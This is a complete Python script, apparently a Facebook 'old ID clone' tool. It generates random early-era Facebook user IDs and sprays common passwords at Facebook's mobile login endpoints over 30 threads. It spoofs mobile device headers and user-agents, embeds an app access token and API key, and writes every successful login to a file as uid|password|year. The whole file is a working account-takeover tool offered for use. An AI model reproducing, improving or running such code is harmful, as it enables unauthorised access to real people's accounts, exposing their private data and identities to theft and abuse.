import os
import time
import uuid
import random
import requests
import sys
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred

# Globals
oks  = []
loop = 0

# Colors
rad = '\x1b[38;5;196m'
G   = '\x1b[38;5;46m'
Y   = '\x1b[38;5;220m'
W   = '\x1b[1;37m'
CY  = '\x1b[38;5;51m'


# ─── User-Agent ───────────────────────────────────────────────
def mobile_agent():
    cv    = random.choice(range(120, 140))
    build = rr(5000, 9000)
    patch = rr(50, 250)
    av    = random.choice(['12', '13', '14'])
    model = random.choice([
        'SM-G991B', 'SM-A536B', 'Pixel 8', 'Pixel 8 Pro',
        'Redmi Note 13 Pro', 'OnePlus 12', 'POCO F5', 'Xiaomi 14',
        'SM-S908B', 'SM-A346B', 'Pixel 7a', 'OnePlus Nord 3'
    ])
    ios_v = f"17_{rr(0,4)}"
    return random.choice([
        f"Mozilla/5.0 (Linux; Android {av}; {model} Build/SKQ1.211019.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv}.0.{build}.{patch} Mobile Safari/537.36 [FBAN/FB4A;FBAV/450.0.0.39.109;]",
        f"Mozilla/5.0 (Linux; Android {av}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv}.0.{build}.{patch} Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android {av}; {model} Build/TQ3A.230901.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv}.0.{build}.{patch} Mobile Safari/537.36",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_v} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    ])


# ─── Random headers ───────────────────────────────────────────
def make_headers(ua):
    return {
        'User-Agent': ua,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'b-graph.facebook.com',
        'X-FB-Net-HNI': str(rr(20000, 40000)),
        'X-FB-SIM-HNI': str(rr(20000, 40000)),
        'X-FB-Connection-Type': random.choice(['MOBILE.LTE', 'MOBILE.5G', 'WIFI']),
        'X-Tigon-Is-Retry': 'False',
        'x-fb-session-id': f"nid={uuid.uuid4().hex[:16]};pid=Main;tid={rr(100,999)};",
        'x-fb-device-group': str(rr(4096, 6144)),
        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
        'X-FB-Request-Analytics-Tags': 'graphservice',
        'X-FB-HTTP-Engine': 'Liger',
        'X-FB-Client-IP': 'True',
        'X-FB-Server-Cluster': 'True',
        'x-fb-connection-token': uuid.uuid4().hex,
        'x-fb-connection-bandwidth': str(rr(20000000, 50000000)),
        'x-fb-connection-quality': random.choice(['EXCELLENT', 'GOOD']),
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
    }


# ─── Creation year from UID ────────────────────────────────────
def creationyear(uid):
    uid = str(uid)
    n   = len(uid)
    if n <= 3:           return '2004'
    if n in (4, 5):      return '2005'
    if n == 6:           return '2005'
    if n == 7:           return '2006'
    if n == 8:           return '2007'
    if n in (9, 10):     return '2008'
    return 'OLD'


# ─── Save hit in  uid|pass|creation_year  format ──────────────
def save_hit(uid, pw, method_label):
    year = creationyear(uid)
    line = f"{uid}|{pw}|{year}\n"
    fname = f"JOY3-OLD-{method_label}-OK.txt"
    open(fname, 'a').write(line)
    oks.append(uid)
    print(
        f"\n {W}[{G}HIT{W}] "
        f"{G}{uid}{W} | "
        f"{Y}{pw}{W} | "
        f"CREATE DATE: {CY}{year}{W}"
    )


# ─── Status bar ───────────────────────────────────────────────
def status(method_label, uid):
    sys.stdout.write(
        f"\r {W}[{rad}{method_label}{W}] "
        f"LOOP:{G}{loop}{W} | "
        f"OK:{G}{len(oks)}{W} | "
        f"TRYING: {Y}{uid}{W}   "
    )
    sys.stdout.flush()


# ─── Method A (POST b-graph) ──────────────────────────────────
def login_1(uid):
    global loop
    session = requests.session()
    try:
        status('M1', uid)
        for pw in ('123456', '1234567', '12345678', '123456789', '000000', '111111', '1234', '12345'):
            ua   = mobile_agent()
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            h   = make_headers(ua)
            res = session.post(
                'https://b-graph.facebook.com/auth/login',
                data=data, headers=h,
                allow_redirects=False, timeout=15
            ).json()

            # Success checks
            if 'session_key' in res:
                save_hit(uid, pw, 'M1')
                return
            err_msg = res.get('error', {}).get('message', '')
            if 'www.facebook.com' in err_msg:
                save_hit(uid, pw, 'M1')
                return
        loop += 1
    except Exception:
        time.sleep(3)


# ─── Method B (GET b-api) ─────────────────────────────────────
def login_2(uid):
    global loop
    status('M2', uid)
    for pw in ('123456', '123123', '1234567', '12345678', '123456789', '000000', '111111', '1234', '12345'):
        try:
            with requests.Session() as session:
                ua = mobile_agent()
                h  = {
                    'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'x-fb-connection-bandwidth': str(rr(20000000, 50000000)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': random.choice(['EXCELLENT', 'GOOD']),
                    'x-fb-connection-type': random.choice([
                        'cell.CTRadioAccessTechnologyLTE',
                        'cell.CTRadioAccessTechnologyNRNSA',
                        'WIFI',
                    ]),
                    'x-fb-http-engine': 'Liger',
                    'x-fb-device-group': str(rr(4096, 6144)),
                    'x-fb-session-id': f"nid={uuid.uuid4().hex[:16]};pid=Main;tid={rr(100,999)};",
                    'x-fb-connection-token': uuid.uuid4().hex,
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate',
                }
                url = (
                    f"https://b-api.facebook.com/method/auth.login"
                    f"?format=json&email={uid}&password={pw}"
                    f"&credentials_type=device_based_login_password"
                    f"&generate_session_cookies=1"
                    f"&error_detail_type=button_with_disabled"
                    f"&source=device_based_login"
                    f"&meta_inf_fbmeta=%20&currently_logged_in_userid=0"
                    f"&method=GET&locale=en_US&client_country_code=US"
                    f"&fb_api_caller_class=com.facebook.account.login.protocol.Fb4aAuthHandler"
                    f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                    f"&fb_api_req_friendly_name=authenticate&cpl=true"
                )
                po = session.get(url, headers=h, timeout=15).json()
                if 'session_key' in str(po):
                    save_hit(uid, pw, 'M2')
                    return
        except Exception:
            pass
    loop += 1


# ─── UI helpers ───────────────────────────────────────────────
def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def banner():
    os.system('cls' if 'win' in sys.platform else 'clear')
    print("""\033[1;32m
░░░░░██╗░█████╗░██╗░░░██╗  ██████╗
░░░░░██║██╔══██╗╚██╗░██╔╝  ╚════██╗
░░░░░██║██║░░██║░╚████╔╝░   █████╔╝
██╗░░██║██║░░██║░░╚██╔╝░░  ██╔═══╝░
╚█████╔╝╚█████╔╝░░░██║░░░  ███████╗
░╚════╝░░╚════╝░░░░╚═╝░░░  ╚══════╝
\033[0m""")
    print(f"       {W}[ {G}2004-2008 VERY OLD ID CLONE TOOL v3{W} ]")
    print(f"       {W}[ {CY}OUTPUT: uid | pass | creation_year{W} ]")
    linex()


# ─── Main ─────────────────────────────────────────────────────
def main():
    banner()
    print(f"       {W}({rad}1{W}) {G}2004  {W}→ {Y}1 – 9,999")
    linex()
    print(f"       {W}({rad}2{W}) {G}2005  {W}→ {Y}10,000 – 999,999")
    linex()
    print(f"       {W}({rad}3{W}) {G}2006  {W}→ {Y}1,000,000 – 9,999,999")
    linex()
    print(f"       {W}({rad}4{W}) {G}2007  {W}→ {Y}10,000,000 – 99,999,999")
    linex()
    print(f"       {W}({rad}5{W}) {G}2008  {W}→ {Y}100,000,000 – 999,999,999")
    linex()
    print(f"       {W}({rad}A{W}) {G}ALL   {W}→ {Y}2004-2008 MIX")
    linex()

    year_sel = input(f"       {W}[{rad}★{W}] SELECT YEAR {W}: {Y}").strip().upper()

    year_ranges = {
        '1': (1,         9_999),
        '2': (10_000,    999_999),
        '3': (1_000_000, 9_999_999),
        '4': (10_000_000, 99_999_999),
        '5': (100_000_000, 999_999_999),
    }

    banner()
    limit = input(f"       {W}[{rad}★{W}] TOTAL ID COUNT (ex: 50000) {W}: {Y}").strip()
    linex()

    try:
        limit_int = int(limit)
    except ValueError:
        print(f"    {rad}Invalid number.")
        time.sleep(2)
        return

    ids = []
    if year_sel == 'A':
        ranges = list(year_ranges.values())
        for _ in range(limit_int):
            lo, hi = random.choice(ranges)
            ids.append(str(rr(lo, hi)))
    elif year_sel in year_ranges:
        lo, hi = year_ranges[year_sel]
        for _ in range(limit_int):
            ids.append(str(rr(lo, hi)))
    else:
        print(f"\n    {rad}Invalid selection.")
        time.sleep(2)
        return

    print(f"       {W}({rad}A{W}) {G}METHOD A  {W}(POST b-graph)")
    linex()
    print(f"       {W}({rad}B{W}) {G}METHOD B  {W}(GET b-api)")
    linex()
    meth = input(f"       {W}[{rad}★{W}] CHOICE {W}(A/B): {Y}").strip().upper()

    outfile = f"JOY3-OLD-M{'1' if meth == 'A' else '2'}-OK.txt"

    with tred(max_workers=30) as pool:
        banner()
        print(f"       {W}[{rad}★{W}] TOTAL IDS  {W}: {G}{limit_int}")
        print(f"       {W}[{rad}★{W}] SERIES     {W}: {G}2004-2008 VERY OLD")
        print(f"       {W}[{rad}★{W}] METHOD     {W}: {G}{meth}")
        print(f"       {W}[{rad}★{W}] OUTPUT     {W}: {Y}{outfile}")
        print(f"       {W}[{rad}★{W}] FORMAT     {W}: {CY}uid | pass | creation_year")
        linex()

        for uid in ids:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD")
                break

    print(f"\n\n       {W}[{G}DONE{W}] Total OK : {G}{len(oks)}")
    linex()


if __name__ == '__main__':
    main()
